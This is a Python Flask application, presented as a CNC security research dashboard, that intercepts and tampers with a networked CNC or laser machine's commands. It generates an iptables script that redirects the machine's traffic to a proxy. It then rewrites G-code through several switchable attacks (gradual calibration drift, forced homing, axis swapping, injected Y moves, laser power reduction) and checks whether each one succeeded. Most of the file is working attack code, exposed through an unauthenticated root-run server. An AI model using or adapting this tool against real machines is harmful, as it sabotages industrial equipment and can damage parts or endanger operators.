#!/usr/bin/env python3
"""
Enhanced CNC Security Research Dashboard with Network Configuration
Flask application with IPTables control
Save as: dashboard_enhanced.py
Run as: sudo python3 dashboard_enhanced.py (needs sudo for IPTables)
Access at: http://localhost:5000
"""

from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
import json
import os
import subprocess
import time
import threading
from datetime import datetime
from collections import deque
import socket
import re

# Set template and static folders to parent directory (project root)
template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')

app = Flask(__name__, template_folder=template_dir, static_folder=static_dir)
app.config['SECRET_KEY'] = 'cnc-security-research-2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global data storage
class DashboardData:
    def __init__(self):
        self.attack_log = deque(maxlen=200)
        self.command_log = deque(maxlen=500)
        self.statistics = {
            'total_commands': 0,
            'modified_commands': 0,
            'verified_attacks': 0,
            'failed_attacks': 0,
            'max_drift': 0.0,
            'avg_latency': 0.0,
            'active_attacks': [],
            'firmware_responses': {}
        }
        
        # Network configuration
        self.network_config = {
            'cnc_ip': '192.168.0.170',
            'cnc_port': 8080,
            'controller_ip': '',  # Auto-detect
            'proxy_port': 8888,
            'interface': 'eth0'
        }
        
        self.path_data = {
            'original': [],
            'modified': [],
            'comparison': []
        }
        
        self.cnc_connected = False
        self.cnc_socket = None
        self.iptables_active = False
        
        # Attack configurations
        self.attack_configs = {
            'calibration_drift': {
                'enabled': False,
                'drift_rate': 1.0,
                'current_drift': 0.0,
                'max_drift': 20.0
            },
            'home_override': {
                'enabled': False,
                'override_command': '$H'
            },
            'axis_swap': {
                'enabled': False
            },
            'y_injection': {
                'enabled': False,
                'injection_amount': -2.0
            },
            'power_reduction': {
                'enabled': False,
                'reduction_factor': 0.5
            }
        }
        
        # Verification tracking
        self.verification_stats = {
            'drift_verified': 0,
            'drift_failed': 0,
            'swap_verified': 0,
            'swap_failed': 0,
            'injection_verified': 0,
            'injection_failed': 0,
            'power_verified': 0,
            'power_failed': 0
        }

dashboard_data = DashboardData()

@app.route('/')
def index():
    """Main dashboard page"""
    return render_template('dashboard_enhanced.html')

@app.route('/api/network/config', methods=['GET', 'POST'])
def network_config():
    """Get or update network configuration"""
    if request.method == 'POST':
        data = request.json
        dashboard_data.network_config.update(data)
        
        # Log configuration change
        add_log_entry(f"Network config updated: {data}", "config")
        socketio.emit('network_config_update', dashboard_data.network_config)
        
        return jsonify({
            'success': True,
            'config': dashboard_data.network_config
        })
    else:
        return jsonify(dashboard_data.network_config)

@app.route('/api/iptables/setup', methods=['POST'])
def setup_iptables():
    """Set up IPTables rules for interception"""
    try:
        # Create the IPTables script
        script_path = '/tmp/setup_iptables.sh'
        with open(script_path, 'w') as f:
            f.write(generate_iptables_script())
        
        os.chmod(script_path, 0o755)
        
        # Execute the script
        config = dashboard_data.network_config
        cmd = [
            'sudo', 'bash', script_path,
            '--cnc-ip', config['cnc_ip'],
            '--proxy-port', str(config['proxy_port']),
            '--enable'
        ]
        
        if config.get('controller_ip'):
            cmd.extend(['--controller-ip', config['controller_ip']])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            dashboard_data.iptables_active = True
            add_log_entry("IPTables rules enabled successfully", "success")
            
            # Parse output for details
            output_lines = result.stdout.split('\n')
            details = [line for line in output_lines if '✓' in line or '✗' in line]
            
            return jsonify({
                'success': True,
                'message': 'IPTables rules configured',
                'details': details,
                'output': result.stdout
            })
        else:
            add_log_entry(f"IPTables setup failed: {result.stderr}", "error")
            return jsonify({
                'success': False,
                'error': result.stderr,
                'output': result.stdout
            })
            
    except Exception as e:
        add_log_entry(f"IPTables error: {str(e)}", "error")
        return jsonify({
            'success': False,
            'error': str(e)
        })

@app.route('/api/iptables/disable', methods=['POST'])
def disable_iptables():
    """Disable IPTables rules"""
    try:
        script_path = '/tmp/setup_iptables.sh'
        
        # Make sure script exists
        if not os.path.exists(script_path):
            with open(script_path, 'w') as f:
                f.write(generate_iptables_script())
            os.chmod(script_path, 0o755)
        
        config = dashboard_data.network_config
        cmd = [
            'sudo', 'bash', script_path,
            '--cnc-ip', config['cnc_ip'],
            '--proxy-port', str(config['proxy_port']),
            '--disable'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        dashboard_data.iptables_active = False
        add_log_entry("IPTables rules disabled", "info")
        
        return jsonify({
            'success': True,
            'message': 'IPTables rules disabled',
            'output': result.stdout
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })

@app.route('/api/iptables/status', methods=['GET'])
def iptables_status():
    """Get IPTables status"""
    try:
        # Check current rules
        result = subprocess.run(
            ['sudo', 'iptables', '-t', 'nat', '-L', 'PREROUTING', '-n'],
            capture_output=True, text=True
        )
        
        rules = result.stdout
        cnc_ip = dashboard_data.network_config['cnc_ip']
        
        # Check if our rules are active
        active = cnc_ip in rules and 'REDIRECT' in rules
        
        return jsonify({
            'active': active,
            'rules': rules,
            'config': dashboard_data.network_config
        })
        
    except Exception as e:
        return jsonify({
            'active': False,
            'error': str(e)
        })

@app.route('/api/connect', methods=['POST'])
def connect_cnc():
    """Connect to CNC with configured settings"""
    data = request.json
    
    # Update config if provided
    if 'cnc_ip' in data:
        dashboard_data.network_config['cnc_ip'] = data['cnc_ip']
    if 'cnc_port' in data:
        dashboard_data.network_config['cnc_port'] = int(data['cnc_port'])
    
    try:
        if dashboard_data.cnc_socket:
            dashboard_data.cnc_socket.close()
            
        dashboard_data.cnc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dashboard_data.cnc_socket.settimeout(5)
        dashboard_data.cnc_socket.connect((
            dashboard_data.network_config['cnc_ip'],
            dashboard_data.network_config['cnc_port']
        ))
        dashboard_data.cnc_connected = True
        
        # Get initial response
        try:
            greeting = dashboard_data.cnc_socket.recv(1024).decode('utf-8', errors='ignore').strip()
            add_log_entry(f"Connected to CNC: {greeting}", "success")
        except:
            pass
            
        socketio.emit('connection_status', {'connected': True})
        return jsonify({'success': True, 'message': 'Connected to CNC'})
        
    except Exception as e:
        dashboard_data.cnc_connected = False
        socketio.emit('connection_status', {'connected': False})
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Send command to CNC with complete logging"""
    if not dashboard_data.cnc_connected:
        return jsonify({'success': False, 'error': 'Not connected to CNC'})
    
    data = request.json
    command = data.get('command', '')
    apply_attacks = data.get('apply_attacks', False)
    
    original_command = command
    attacks_applied = []
    modifications = {}
    
    # Apply attacks if enabled
    if apply_attacks:
        command, attacks_applied, modifications = apply_attack_modifications(command)
    
    try:
        # Send command
        start_time = time.perf_counter()
        dashboard_data.cnc_socket.send((command + "\n").encode())
        
        # Get response
        dashboard_data.cnc_socket.settimeout(1)
        response = ""
        try:
            response = dashboard_data.cnc_socket.recv(1024).decode('utf-8', errors='ignore').strip()
        except socket.timeout:
            response = "[TIMEOUT]"
        
        latency = (time.perf_counter() - start_time) * 1000
        
        # Verify attacks
        verification = verify_attack_success(original_command, command, response, attacks_applied)
        
        # Create log entry with detailed timestamp
        log_entry = {
            'id': f"{time.time():.3f}",
            'timestamp': datetime.now().isoformat(),
            'timestamp_ms': int(time.time() * 1000),
            'original': original_command,
            'modified': command,
            'response': response,
            'latency': latency,
            'attacks': attacks_applied,
            'modifications': modifications,
            'verification': verification
        }
        
        # Add to command log
        dashboard_data.command_log.append(log_entry)
        
        # Log to file with timestamp
        log_to_file(log_entry)
        
        # Update statistics
        update_statistics(log_entry)
        
        # Emit to all clients
        socketio.emit('command_executed', log_entry)
        
        return jsonify({
            'success': True,
            'log_entry': log_entry
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/attack_config', methods=['GET', 'POST'])
def attack_config():
    """Get or update attack configuration"""
    if request.method == 'POST':
        data = request.json
        attack_type = data.get('attack_type')
        params = data.get('parameters', {})
        
        if attack_type in dashboard_data.attack_configs:
            dashboard_data.attack_configs[attack_type].update(params)
            
            # Log configuration change
            timestamp = datetime.now().isoformat()
            log_msg = f"[{timestamp}] Attack config updated: {attack_type} = {params}"
            add_log_entry(log_msg, "config")
            
            # Log to file
            with open(f"attack_config_{datetime.now().strftime('%Y%m%d')}.log", 'a') as f:
                f.write(log_msg + '\n')
            
            socketio.emit('attack_config_update', dashboard_data.attack_configs)
            
            return jsonify({
                'success': True,
                'config': dashboard_data.attack_configs[attack_type]
            })
    else:
        return jsonify(dashboard_data.attack_configs)

def log_to_file(log_entry):
    """Write timestamped log entry to file"""
    log_filename = f"cnc_commands_{datetime.now().strftime('%Y%m%d')}.log"
    
    with open(log_filename, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        f.write(f"[{timestamp}] ")
        f.write(f"ID:{log_entry['id']} ")
        f.write(f"ORIG:{log_entry['original']} ")
        f.write(f"MOD:{log_entry['modified']} ")
        f.write(f"RESP:{log_entry['response']} ")
        f.write(f"LAT:{log_entry['latency']:.2f}ms ")
        f.write(f"VERIFY:{log_entry.get('verification', 'N/A')} ")
        f.write(f"ATTACKS:{','.join(log_entry.get('attacks', []))}\n")
    
    # Also write to JSON log for structured data
    json_filename = f"cnc_commands_{datetime.now().strftime('%Y%m%d')}.jsonl"
    with open(json_filename, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

def generate_iptables_script():
    """Generate the IPTables configuration script"""
    return '''#!/bin/bash
# CNC Security Research - IPTables Configuration
# Generated by Dashboard

CNC_IP="${CNC_IP:-192.168.0.170}"
CNC_PORTS="${CNC_PORTS:-8080,23,80}"
PROXY_PORT="${PROXY_PORT:-8888}"
CONTROLLER_IP="${CONTROLLER_IP:-}"
ACTION="enable"

while [[ $# -gt 0 ]]; do
    case $1 in
        --cnc-ip) CNC_IP="$2"; shift 2 ;;
        --proxy-port) PROXY_PORT="$2"; shift 2 ;;
        --controller-ip) CONTROLLER_IP="$2"; shift 2 ;;
        --enable) ACTION="enable"; shift ;;
        --disable) ACTION="disable"; shift ;;
        --status) ACTION="status"; shift ;;
        *) shift ;;
    esac
done

enable_rules() {
    echo "Enabling CNC Interception Rules"
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "[OK] IP forwarding enabled"
    
    # Clear existing rules
    iptables -t nat -D PREROUTING -p tcp -d $CNC_IP -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    iptables -t mangle -D PREROUTING -d $CNC_IP -j MARK --set-mark 0x1337 2>/dev/null
    
    # Add marking rule
    iptables -t mangle -A PREROUTING -d $CNC_IP -j MARK --set-mark 0x1337
    echo "[OK] Marked packets to $CNC_IP"
    
    # Redirect traffic
    IFS=',' read -ra PORTS <<< "$CNC_PORTS"
    for port in "${PORTS[@]}"; do
        iptables -t nat -A PREROUTING -p tcp -d $CNC_IP --dport $port -j REDIRECT --to-port $PROXY_PORT
        echo "[OK] Redirecting port $port to proxy port $PROXY_PORT"
    done
    
    # Controller-specific rules if specified
    if [ ! -z "$CONTROLLER_IP" ]; then
        for port in "${PORTS[@]}"; do
            iptables -t nat -I PREROUTING -s $CONTROLLER_IP -p tcp -d $CNC_IP --dport $port -j REDIRECT --to-port $PROXY_PORT
        done
        echo "[OK] Specific redirection from $CONTROLLER_IP"
    fi
    
    # Allow forwarding
    iptables -A FORWARD -d $CNC_IP -j ACCEPT 2>/dev/null
    iptables -A FORWARD -s $CNC_IP -j ACCEPT 2>/dev/null
    echo "[OK] Forwarding rules added"
}

disable_rules() {
    echo "Disabling CNC Interception Rules"
    
    IFS=',' read -ra PORTS <<< "$CNC_PORTS"
    for port in "${PORTS[@]}"; do
        iptables -t nat -D PREROUTING -p tcp -d $CNC_IP --dport $port -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    done
    
    iptables -t mangle -D PREROUTING -d $CNC_IP -j MARK --set-mark 0x1337 2>/dev/null
    iptables -D FORWARD -d $CNC_IP -j ACCEPT 2>/dev/null
    iptables -D FORWARD -s $CNC_IP -j ACCEPT 2>/dev/null
    
    echo "[OK] Rules removed"
}

case $ACTION in
    enable) enable_rules ;;
    disable) disable_rules ;;
esac
'''

def apply_attack_modifications(command):
    """Apply active attack modifications to command"""
    original = command
    modified = command
    attacks_applied = []
    modifications = {}
    
    # Home override - replaces everything
    if dashboard_data.attack_configs['home_override']['enabled']:
        modified = dashboard_data.attack_configs['home_override']['override_command']
        attacks_applied.append('HOME_OVERRIDE')
        modifications['home_override'] = {
            'original': original,
            'replaced_with': modified
        }
        return modified, attacks_applied, modifications
    
    # Y-axis injection - REPLACES movement commands with Y movement
    if dashboard_data.attack_configs['y_injection']['enabled']:
        if 'G1' in command or 'G0' in command:
            # Extract feed rate if present
            feed_match = re.search(r'F(\d+)', command)
            feed_rate = f" F{feed_match.group(1)}" if feed_match else ""
            
            # Replace entire command with Y injection
            injection_amount = dashboard_data.attack_configs['y_injection']['injection_amount']
            modified = f"G1 Y{injection_amount}{feed_rate}"
            attacks_applied.append('Y_INJECTION')
            modifications['y_injection'] = {
                'original_command': original,
                'replaced_with': modified,
                'injection_amount': injection_amount
            }
            return modified, attacks_applied, modifications
    
    # Axis swap
    if dashboard_data.attack_configs['axis_swap']['enabled']:
        x_match = re.search(r'X([\-\d.]+)', modified)
        y_match = re.search(r'Y([\-\d.]+)', modified)
        if x_match and y_match:
            x_val = x_match.group(1)
            y_val = y_match.group(1)
            modified = re.sub(r'X[\-\d.]+', f'X{y_val}', modified)
            modified = re.sub(r'Y[\-\d.]+', f'Y{x_val}', modified)
            attacks_applied.append('AXIS_SWAP')
            modifications['axis_swap'] = {
                'original_x': x_val,
                'original_y': y_val,
                'swapped_x': y_val,
                'swapped_y': x_val
            }
    
    # Calibration drift
    if dashboard_data.attack_configs['calibration_drift']['enabled']:
        for axis in ['X', 'Y']:
            match = re.search(f'{axis}([\\-\\d.]+)', modified)
            if match:
                val = float(match.group(1))
                drift = dashboard_data.attack_configs['calibration_drift']['current_drift']
                new_val = val + drift
                modified = modified.replace(f'{axis}{val}', f'{axis}{new_val:.3f}')
                
                if axis not in modifications:
                    modifications[f'drift_{axis.lower()}'] = {}
                modifications[f'drift_{axis.lower()}'] = {
                    'original': val,
                    'drift_amount': drift,
                    'final': new_val
                }
        
        if 'X' in command or 'Y' in command:
            attacks_applied.append('CALIBRATION_DRIFT')
            config = dashboard_data.attack_configs['calibration_drift']
            config['current_drift'] += config['drift_rate']
            if config['current_drift'] > config['max_drift']:
                config['current_drift'] = 0
                modifications['drift_reset'] = True
    
    # Power reduction
    if dashboard_data.attack_configs['power_reduction']['enabled']:
        power_match = re.search(r'S(\d+)', modified)
        if power_match:
            power = int(power_match.group(1))
            new_power = int(power * dashboard_data.attack_configs['power_reduction']['reduction_factor'])
            modified = modified.replace(f'S{power}', f'S{new_power}')
            attacks_applied.append('POWER_REDUCTION')
            modifications['power_reduction'] = {
                'original': power,
                'factor': dashboard_data.attack_configs['power_reduction']['reduction_factor'],
                'reduced_to': new_power
            }
    
    return modified, attacks_applied, modifications

def verify_attack_success(original, modified, response, attacks):
    """Verify that attacks were successfully applied"""
    if not attacks:
        return "NO_ATTACKS"
    
    verification_results = []
    
    if 'CALIBRATION_DRIFT' in attacks:
        orig_x = re.search(r'X([\-\d.]+)', original)
        mod_x = re.search(r'X([\-\d.]+)', modified)
        if orig_x and mod_x and orig_x.group(1) != mod_x.group(1):
            verification_results.append("DRIFT_VERIFIED")
            dashboard_data.verification_stats['drift_verified'] += 1
        else:
            verification_results.append("DRIFT_FAILED")
            dashboard_data.verification_stats['drift_failed'] += 1
    
    if 'AXIS_SWAP' in attacks:
        orig_x = re.search(r'X([\-\d.]+)', original)
        orig_y = re.search(r'Y([\-\d.]+)', original)
        mod_x = re.search(r'X([\-\d.]+)', modified)
        mod_y = re.search(r'Y([\-\d.]+)', modified)
        if orig_x and orig_y and mod_x and mod_y:
            if orig_x.group(1) == mod_y.group(1) and orig_y.group(1) == mod_x.group(1):
                verification_results.append("SWAP_VERIFIED")
                dashboard_data.verification_stats['swap_verified'] += 1
            else:
                verification_results.append("SWAP_FAILED")
                dashboard_data.verification_stats['swap_failed'] += 1
    
    if 'Y_INJECTION' in attacks:
        if 'G1 Y' in modified and 'G1 Y' not in original:
            verification_results.append("INJECTION_VERIFIED")
            dashboard_data.verification_stats['injection_verified'] += 1
        else:
            verification_results.append("INJECTION_FAILED")
            dashboard_data.verification_stats['injection_failed'] += 1
    
    if 'POWER_REDUCTION' in attacks:
        orig_power = re.search(r'S(\d+)', original)
        mod_power = re.search(r'S(\d+)', modified)
        if orig_power and mod_power:
            if int(mod_power.group(1)) < int(orig_power.group(1)):
                verification_results.append("POWER_VERIFIED")
                dashboard_data.verification_stats['power_verified'] += 1
            else:
                verification_results.append("POWER_FAILED")
                dashboard_data.verification_stats['power_failed'] += 1
    
    if 'ok' in response.lower():
        verification_results.append("RESPONSE_OK")
    elif 'error' in response.lower():
        verification_results.append("RESPONSE_ERROR")
    
    return '|'.join(verification_results) if verification_results else "UNVERIFIED"

def update_statistics(log_entry):
    """Update dashboard statistics"""
    dashboard_data.statistics['total_commands'] += 1
    
    if log_entry['original'] != log_entry['modified']:
        dashboard_data.statistics['modified_commands'] += 1
    
    if 'VERIFIED' in log_entry.get('verification', ''):
        dashboard_data.statistics['verified_attacks'] += 1
    
    if 'FAILED' in log_entry.get('verification', ''):
        dashboard_data.statistics['failed_attacks'] += 1
    
    # Update average latency
    if dashboard_data.statistics['avg_latency'] == 0:
        dashboard_data.statistics['avg_latency'] = log_entry['latency']
    else:
        dashboard_data.statistics['avg_latency'] = (
            dashboard_data.statistics['avg_latency'] * 0.9 + log_entry['latency'] * 0.1
        )

def add_log_entry(message, log_type='info'):
    """Add entry to attack log"""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'message': message,
        'type': log_type
    }
    dashboard_data.attack_log.append(entry)
    socketio.emit('log_update', entry)

@app.route('/api/status')
def get_status():
    """Get complete dashboard status"""
    return jsonify({
        'connected': dashboard_data.cnc_connected,
        'iptables_active': dashboard_data.iptables_active,
        'network_config': dashboard_data.network_config,
        'statistics': dashboard_data.statistics,
        'verification_stats': dashboard_data.verification_stats,
        'active_attacks': dashboard_data.attack_configs
    })

@app.route('/api/export_complete_log')
def export_complete_log():
    """Export complete command log with all details"""
    export_data = {
        'session_id': f"CNC_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
        'timestamp': datetime.now().isoformat(),
        'network_config': dashboard_data.network_config,
        'statistics': dashboard_data.statistics,
        'verification_stats': dashboard_data.verification_stats,
        'command_log': list(dashboard_data.command_log),
        'attack_log': list(dashboard_data.attack_log)
    }
    
    filename = f"cnc_complete_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(export_data, f, indent=2)
    
    return send_file(filename, as_attachment=True)

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    emit('connection_status', {'connected': dashboard_data.cnc_connected})
    emit('network_config_update', dashboard_data.network_config)
    emit('statistics_update', dashboard_data.statistics)

@socketio.on('configure_attack')
def handle_attack_config(data):
    """Configure attack parameters"""
    attack_type = data.get('attack_type')
    params = data.get('parameters', {})
    
    if attack_type in dashboard_data.attack_configs:
        dashboard_data.attack_configs[attack_type].update(params)
        emit('attack_config_update', dashboard_data.attack_configs, broadcast=True)

if __name__ == '__main__':
    print("="*60)
    print("Enhanced CNC Security Research Dashboard")
    print("="*60)
    print("Starting Flask server on http://localhost:5000")
    print("Run with sudo for IPTables control")
    print("="*60)
    
    # Check if running as root (UNIX). On Windows, os.geteuid() is not available
    try:
        is_root = (os.geteuid() == 0)
    except AttributeError:
        # Windows or other platforms without geteuid
        is_root = False

    if is_root:
        print("[OK] Running as root - IPTables control enabled")
    else:
        if os.name == 'nt':
            print("WARNING: Running on Windows: IPTables control is not supported. Proceeding without IPTables functionality.")
        else:
            print("WARNING: Not running as root - IPTables control may fail")
            print("  Restart with: sudo python3 dashboard_enhanced.py")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
